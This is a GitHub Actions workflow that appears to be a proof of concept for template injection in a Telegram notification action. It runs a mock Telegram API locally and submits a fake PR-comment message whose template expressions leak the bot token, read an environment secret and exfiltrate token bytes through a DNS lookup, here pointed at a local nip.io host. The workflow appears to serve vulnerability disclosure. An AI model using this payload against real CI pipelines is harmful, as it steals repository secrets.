name: ssti-poc
on:
  workflow_dispatch:

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: Extract the drone-telegram binary from the exact image the action runs
        run: |
          set -euo pipefail
          docker pull ghcr.io/appleboy/telegram-action:1.1.1
          docker create --name tg ghcr.io/appleboy/telegram-action:1.1.1
          docker cp tg:/bin/drone-telegram ./drone-telegram
          docker rm -f tg
          chmod +x ./drone-telegram
          echo "entrypoint of action image:" && docker image inspect ghcr.io/appleboy/telegram-action:1.1.1 --format '{{json .Config.Entrypoint}}'
          strings -a ./drone-telegram | grep -m1 'drone-template-lib/template.RenderTrim'

      - name: Start a mock Telegram API on api.telegram.org:443
        run: |
          set -euo pipefail
          mkdir -p certs
          openssl req -x509 -newkey rsa:2048 -nodes -keyout certs/key.pem -out certs/cert.pem -days 1 \
            -subj "/CN=api.telegram.org" -addext "subjectAltName=DNS:api.telegram.org" >/dev/null 2>&1
          cat > mock.py <<'PY'
          import http.server, ssl, json
          class H(http.server.BaseHTTPRequestHandler):
              def log_message(self, *a): pass
              def _reply(self, obj):
                  b = json.dumps(obj).encode()
                  self.send_response(200)
                  self.send_header("Content-Type", "application/json")
                  self.send_header("Content-Length", str(len(b)))
                  self.end_headers()
                  self.wfile.write(b)
              def do_GET(self):
                  with open("requests.log", "a") as f: f.write("GET " + self.path + "\n")
                  self._reply({"ok": True, "result": {"id": 123456789, "is_bot": True,
                              "first_name": "mock", "username": "mockbot"}})
              def do_POST(self):
                  n = int(self.headers.get("Content-Length", "0"))
                  body = self.rfile.read(n).decode("utf-8", "replace")
                  with open("requests.log", "a") as f:
                      f.write("POST " + self.path + " BODY " + body + "\n")
                  self._reply({"ok": True, "result": {"message_id": 1, "date": 0,
                              "chat": {"id": 42, "type": "private"}, "text": "x"}})
          httpd = http.server.HTTPServer(("127.0.0.1", 443), H)
          ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
          ctx.load_cert_chain("certs/cert.pem", "certs/key.pem")
          httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
          httpd.serve_forever()
          PY
          echo "127.0.0.1 api.telegram.org" | sudo tee -a /etc/hosts
          sudo SSL_CERT_FILE=$PWD/certs/cert.pem nohup python3 mock.py >mock.out 2>&1 &
          sleep 3
          curl -s --cacert certs/cert.pem https://api.telegram.org/bot1:AAH/getMe; echo

      - name: Run the action entrypoint exactly as the workflow's message input reaches it
        env:
          GITHUB: "true"
          INPUT_TOKEN: "123456789:AAHfakefakefakefakefakefakefakefakefak"
          INPUT_TO: "42"
          SSL_CERT_FILE: ${{ github.workspace }}/certs/cert.pem
          INPUT_MESSAGE: |
            User @attacker commented PR #1 "TOKEN={{ Config.Token }} HEX={{ printf "%x" Config.Token }} ENV={{ env (printf "INPUT%cTOKEN" 95) }} DNS={{ getHostByName (printf "%s.127.0.0.1.nip.io" (substr 0 20 (printf "%x" Config.Token))) }}" (https://github.com/victim/repo/pull/1)
        run: |
          set -euo pipefail
          ./drone-telegram || true
          echo "=== captured outbound Telegram API requests ==="
          cat requests.log
